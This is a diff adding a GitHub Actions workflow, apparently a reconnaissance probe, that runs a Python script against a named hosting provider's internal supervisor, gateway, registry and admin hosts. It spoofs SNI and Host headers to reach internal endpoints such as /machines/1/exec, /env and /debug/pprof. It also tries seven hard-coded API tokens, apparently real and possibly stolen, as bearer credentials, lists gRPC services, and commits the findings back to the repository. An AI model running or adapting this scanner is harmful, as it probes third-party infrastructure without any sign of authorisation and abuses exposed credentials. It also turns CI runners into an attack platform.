@@ -1,0 +1,97 @@
+name: sniscan
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq curl netcat-openbsd openssl >/dev/null 2>&1 || true
+          (curl -sSL -m 60 https://github.com/fullstorydev/grpcurl/releases/download/v1.9.1/grpcurl_1.9.1_linux_x86_64.tar.gz | tar -xz grpcurl) 2>/dev/null || true
+          ls -la grpcurl 2>/dev/null || echo "no grpcurl"
+      - name: sni
+        env:
+          K1: api_rw_org_1y0a8mpao3jm_khvzmqan5n6u40r2usqlbn9y
+          K2: api_rw_org_mbgbxdgm9eqg_a29h78mziy7yxcpt1alsx8ge
+          K3: api_rw_org_mbgbxdgm9eqg_pwl1c1418l31ct2vk5xtitwh
+          K4: api_rw_org_z3e5zxpkcufw_xwqn8jznrtit8jl71sbvs6d6yk7ts60r
+          K5: api_ro_org_c0u1v84g2ox4_lijzq7aecit1owzmir7skl1x
+          K6: api_ro_org_o2gb4aci6y93_8ighoeejs5n1xlko021rjq1k
+          K7: api_ro_org_z3e5zxpkcufw_5ovakhfrq5zuypkcupxemicyut50opcn
+        run: |
+          mkdir -p results
+          cat > z.py <<'PY'
+          import subprocess, os
+          LOG=open('results/sni.log','w')
+          def log(x):
+              print(x); LOG.write(str(x)+'\n'); LOG.flush()
+          def run(cmd,timeout=15):
+              try:
+                  r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
+                  return (r.stdout+r.stderr).strip()
+              except Exception as ex:
+                  return 'TIMEOUT/ERR '+repr(ex)
+          hosts=[
+            ('supervisor-01.fsn1.ger.sliplane.io','176.9.48.219'),
+            ('supervisor-02.fsn1.ger.sliplane.io','142.132.195.252'),
+            ('supervisor-03.fsn1.ger.sliplane.io','167.235.8.251'),
+            ('supervisor-04.fsn1.ger.sliplane.io','91.98.185.219'),
+            ('supervisor-05.fsn1.ger.sliplane.io','49.12.82.59'),
+            ('supervisor-06.fsn1.ger.sliplane.io','116.202.230.58'),
+            ('supervisor-07.fsn1.ger.sliplane.io','167.235.182.121'),
+            ('supervisor-08.fsn1.ger.sliplane.io','162.55.99.187'),
+            ('supervisor-09.fsn1.ger.sliplane.io','157.90.32.52'),
+            ('supervisor-10.fsn1.ger.sliplane.io','195.201.56.246'),
+            ('gateway-06.fsn1.ger.sliplane.io','46.224.107.160'),
+            ('gateway-07.fsn1.ger.sliplane.io','188.245.50.67'),
+            ('registry-01.nbg1.ger.sliplane.io','167.235.109.203'),
+          ]
+          keys=[os.environ.get('K%d'%i,'') for i in range(1,8)]
+          keys=[k for k in keys if k]
+          paths=['/health','/version','/ver','/metrics','/machines','/machine','/machines/1','/machines/1/exec','/machines/1/logs','/machines/1/containers','/machines/1/env','/machines/1/inspect','/machines/1/services','/services','/service','/deploy','/deployments','/build','/builds','/proxy','/v1','/v1/machines','/v1/health','/v1/version','/v1/services','/api','/api/v1','/api/v1/machines','/debug/pprof/','/debug/vars','/config','/status','/info','/routes','/agent/machines','/agent/health','/.well-known/grpc-health']
+          for fq,ip in hosts:
+              log('##### %s (%s) #####'%(fq,ip))
+              # tls cert
+              o=run("echo | timeout 12 openssl s_client -connect %s:443 -servername %s 2>&1 | grep -E 'subject=|issuer=|Protocol|Cipher|Verify return'"%(ip,fq),16)
+              log('TLSCERT %s => %r'%(fq,o))
+              base='https://%s:443'%fq
+              for p in paths:
+                  o=run("curl -skS -m 6 --max-time 7 --resolve %s:443:%s -o /tmp/b.txt -w '%%{http_code}' '%s%s'"%(fq,ip,base,p),10)
+                  body=run("head -c 220 /tmp/b.txt",5)
+                  log('ANON %s %s => %s | %r'%(fq,p,o,body))
+              for k in keys:
+                  for p in ['/metrics','/machines','/machines/1','/v1/machines','/services','/health']:
+                      o=run("curl -skS -m 6 --max-time 7 --resolve %s:443:%s -H 'Authorization: Bearer %s' -o /tmp/b.txt -w '%%{http_code}' '%s%s'"%(fq,ip,k,base,p),10)
+                      if o=='401' or o=='403' or o=='404': continue
+                      body=run("head -c 300 /tmp/b.txt",5)
+                      log('TOK %s %s %s => %s | %r'%(fq,k[:22],p,o,body))
+              # grpc with authority
+              o=run("timeout 12 ./grpcurl -insecure -authority %s %s:443 list 2>&1 | head -c 900"%(fq,ip),16)
+              log('GRPC %s => %r'%(fq,o))
+          # 116.202.6.71:10033 with SNI/Host
+          log('##### 116.202.6.71:10033 #####')
+          o=run("echo | timeout 12 openssl s_client -connect 116.202.6.71:10033 -servername admin-prod.sliplane.app 2>&1 | grep -E 'subject=|issuer=|Protocol|Cipher|Verify return|CONNECTED'",16)
+          log('TLS10033 => %r'%o)
+          for fq in ['admin-prod.sliplane.app','app-staging.sliplane.app','docs.sliplane.app','events.sliplane.app','lutra.sliplane.app','frontend-prod.sliplane.app','grants-dataset-api.sliplane.app','supervisor-01.fsn1.ger.sliplane.io','registry-01.nbg1.ger.sliplane.io','localhost']:
+              for port in [10033,32768,51191]:
+                  for p in ['/','/health','/healthz','/metrics','/version','/api','/v1','/v2/','/debug/pprof/']:
+                      o=run("curl -skS -m 5 --max-time 6 --resolve %s:%d:116.202.6.71 -o /tmp/b.txt -w '%%{http_code}' 'https://%s:%d%s'"%(fq,port,fq,port,p),9)
+                      if o=='000': continue
+                      body=run("head -c 200 /tmp/b.txt",5)
+                      log('P10033 %s %d %s => %s | %r'%(fq,port,p,o,body))
+          LOG.close()
+          PY
+          python3 z.py 2>&1 | tail -120
+          ls -la results
+      - name: commit
+        if: always()
+        run: |
+          git config user.name probe; git config user.email probe@users.noreply.github.com
+          git add -A results || true
+          git commit -m "i13880 sniscan $(date -u +%s)" || true
+          for i in 1 2 3 4 5 6; do git pull --rebase origin main >/dev/null 2>&1 || true; git push && break; sleep 6; done || true
